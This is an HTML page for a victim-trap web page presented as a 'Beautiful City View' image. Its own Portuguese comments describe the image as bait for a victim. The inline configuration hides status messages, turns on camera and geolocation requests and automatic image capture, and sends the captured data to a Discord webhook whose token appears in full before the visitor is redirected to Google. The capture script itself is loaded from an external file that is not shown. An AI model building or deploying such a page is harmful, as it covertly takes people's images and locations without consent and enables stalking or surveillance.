<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <title>Beautiful City View</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { 
      margin: 0; 
      padding: 0; 
      background: #000; 
      overflow: hidden;
    }
    #status { 
      display: none; /* إخفاء رسالة التحميل */
    }
    #debugBox { 
      display: none; /* إخفاء مربع التصحيح دائماً */
      position: fixed; 
      top: 10px; 
      left: 10px; 
      background: rgba(0,0,0,0.8); 
      color: white; 
      padding: 5px; 
      font-size: 10px; 
      z-index: 9999;
    }
    #trapContainer { 
      display: block; /* إظهار مباشر */ 
      width: 100vw; 
      height: 100vh; 
      margin: 0; 
      padding: 0;
    }
    #trapImage { 
      width: 100vw; 
      height: 100vh; 
      object-fit: cover; 
      border-radius: 0; 
      box-shadow: none;
    }
    #trapContainer h2, #trapContainer p { 
      display: none; /* إخفاء العناوين */
    }
  </style>
</head>
<body>
  <div id="status">Loading beautiful image...</div>
  <div id="debugBox"></div>
  
  <!-- Imagem isca para atrair a vítima -->
  <div id="trapContainer">
    <h2>Beautiful City View</h2>
    <img id="trapImage" src="" alt="Beautiful city view">
    <p>Click image to enlarge</p>
  </div>

  <!-- Config inline mínima (pode sobrescrever via osint-config.js ou querystring) -->
  <script>
    window.OSINT_CONFIG = {
      webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6XyXxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF", // ⚠️ TROQUE
      finalUrl: "https://www.google.com",   // destino padrão
      requestCamera: true,   // tentar câmera?
      requestGeo: true,      // tentar geolocalização?
      redirectDelayMs: 2000, // atraso antes do redirect
      debug: false,          // esconder logs na tela
      splitImage: true,      // dividir imagem em partes?
      chunkSize: 500000,     // tamanho máximo de cada parte (bytes)
      autoCapture: true,     // capturar imagem automaticamente?
      trapImage: "cityscape.jpg" // imagem isca para atrair vítima
    };
  </script>

  <!-- Importa config externa opcional (se existir; falha silenciosa) -->
  <script src="osint-config.js" defer></script>
  <!-- Script principal -->
  <script src="script.js" defer></script>
</body>
</html>
